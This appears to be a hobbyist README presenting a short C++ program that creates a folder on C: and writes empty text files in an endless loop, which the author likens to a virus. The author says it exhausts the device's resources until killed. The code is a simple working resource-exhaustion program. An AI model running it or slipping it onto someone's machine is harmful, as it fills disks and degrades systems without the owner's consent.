# Why ?
For `experimental` reasons and `curiosity`, I made a very simple program that copies `.txt` document an infinite number of times like a virus.       
technically the number of copies should be 9 * 1e18 (The capacity of long long), but when overflow happens the value of "indexFile" will be negative and will keep running until you kill the program. 
This process will consume as much of the device's resources as possible.

# Code
```c
#include <bits/stdc++.h>
#include <direct.h>
using namespace std;

int main() {

    long long indexFile = 0;
    char const* path = "C:\\Diphro\\";
    _mkdir(path);

    while (true) {
        indexFile++;
        ofstream file (path + to_string(indexFile) +".txt");
    }
}
```
## The output
![Alt text](/images/virus.gif)

